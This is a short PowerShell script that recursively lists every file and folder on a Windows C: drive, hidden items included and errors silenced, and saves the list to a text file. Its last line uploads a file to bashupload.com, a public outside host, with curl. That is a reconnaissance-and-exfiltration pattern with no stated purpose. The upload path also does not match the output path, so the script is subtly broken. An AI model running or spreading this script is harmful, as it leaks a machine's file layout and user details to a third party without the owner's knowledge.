# Define the output file path
$outputFile = ".\tmp\directory_structure.txt"

# Define the directories to exclude
$excludeDirs = @(
    "C:\Program Files", 
    "C:\Program Files (x86)", 
    "C:\Windows", 
    "C:\$Recycle.Bin", 
    "C:\Users\Public", 
    "C:\Users\Administrator-PC", 
    "C:\ProgramData", 
    "C:\Users\*\AppData", 
    "C:\logstash"
)

# Function to get directory structure
function Get-DirectoryStructure {
    param (
        [string]$path
    )

    # Get directories and files
    Get-ChildItem -Path $path -Recurse -Force -ErrorAction SilentlyContinue | Where-Object {
        # Exclude the specified directories
        $exclude = $false
        foreach ($excludeDir in $excludeDirs) {
            if ($_.FullName -like "$excludeDir*") {
                $exclude = $true
                break
            }
        }
        return -not $exclude
    } | ForEach-Object {
        # Output the directory or file path
        $_.FullName
    }
}

# Start with the root directory
$rootDir = "C:\"

# Get the directory structure
$directoryStructure = Get-DirectoryStructure -path $rootDir

# Write to the output file, overwriting if it exists
$directoryStructure | Out-File -FilePath $outputFile -Encoding utf8 -Force

curl bashupload.com -T .\directory_structure.txt
